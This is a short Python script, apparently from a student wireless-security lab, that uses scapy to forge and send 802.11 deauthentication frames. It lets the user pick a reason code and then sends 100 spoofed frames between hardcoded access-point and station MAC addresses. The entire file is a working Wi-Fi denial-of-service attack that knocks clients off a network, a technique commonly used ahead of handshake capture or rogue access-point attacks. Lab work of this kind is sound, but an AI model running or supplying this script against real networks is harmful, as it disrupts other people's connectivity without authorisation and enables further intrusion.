# Authors : Delphine Scherler & Wenes Limem
# Date : 31.03.2022
# Description : Script permettant de générer et d'envoyer des trames de déauthentification. Donne le choix entre des
# Reason codes différents et déduit si le message doit être envoyé à la STA ou à l'AP.

from scapy.layers.dot11 import *


# method to send deauthentication packets
def perform_deauth(src, dest, ap, rc):
    dot11 = Dot11(addr1=dest, addr2=src, addr3=ap)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=rc)
    # send packet
    sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)


if __name__ == '__main__':
    print("Reason code possible : \n 1 - Unspecified   "
          "\n 4 - Disassociated due to inactivity    "
          "\n 5 - Disassociated because AP is unable to handle all currently associated stations   "
          "\n 8 - Deauthenticated because sending STA is leaving BSS ")

    pot_input = ['1', '4', '5', '8']
    # reason codes to send to STA
    pkt_to_sta = ['4', '5']
    # reason codes to send to AP
    pkt_to_ap = ['1', '8']
    rc = 0

    # ask user for the reason code
    while True:
        rc = input("Tapez le code du reason code :")
        ap_addr = "1c:24:cd:47:6d:b0"
        sta_addr = "c8:b2:9b:db:9b:1f"
        if rc in pot_input:
            break
        else:
            print("Mauvais rc")
    print(rc)
    if rc in pkt_to_sta:
        perform_deauth(ap_addr, sta_addr, ap_addr, int(rc))
    else:
        perform_deauth(sta_addr, ap_addr, ap_addr, int(rc))
